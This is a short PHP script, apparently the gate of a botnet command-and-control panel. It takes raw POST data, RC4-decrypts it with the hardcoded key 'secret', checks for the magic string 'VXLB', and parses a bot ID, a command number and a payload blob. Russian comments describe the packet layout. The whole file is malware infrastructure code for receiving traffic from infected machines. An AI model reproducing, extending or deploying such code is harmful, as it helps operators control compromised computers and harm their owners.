<?php
require_once('rc4.php');
$proto_vers = 1;

//получаем сырые данные 
$data = file_get_contents("php://input");

/*
-магическая константа (DWORD) 4
-версия протокола (DWORD) 4
-ид бота (DWORD) 4
-номер команды (DWORD) 4
-blob с данными (DWORD)(BYTE[n])4
-padding (BYTE[n]) 0 
*/

if(strlen($data)>=20)
{
	//расшифруем
	$data = decrypt($data);

	//парсим данные
	$magic = substr($data, 0, 4); 
	if($magic=="VXLB")
	{
		$vers = raw2int(substr($data, 4, 4));

		if($vers == $proto_vers)
		{
			$botid = raw2hex(substr($data, 8, 4));
			$cnum = raw2int(substr($data, 12, 4));
			$blobnum = raw2int(substr($data, 16, 4));
			if($blobnum>0 AND $blobnum <(strlen($data)-20))
			{
				$blobdata=substr($data, 20, $blobnum);
			}
			
			echo "botid $botid\n";
			echo "cnum $cnum\n";
			echo "blobnum $blobnum\n";
			echo "blobdata $blobdata\n";
		}
	}
}

function decrypt($r)
{
	$data = $r;
	rc4($data,rc4Init('secret'));
	return $data;
}

function raw2int($r)
{
	$s = unpack("L",$r);
	return $s[1];
}

function raw2hex($r)
{
	$s = unpack("h*",$r);
	return $s[1];
}
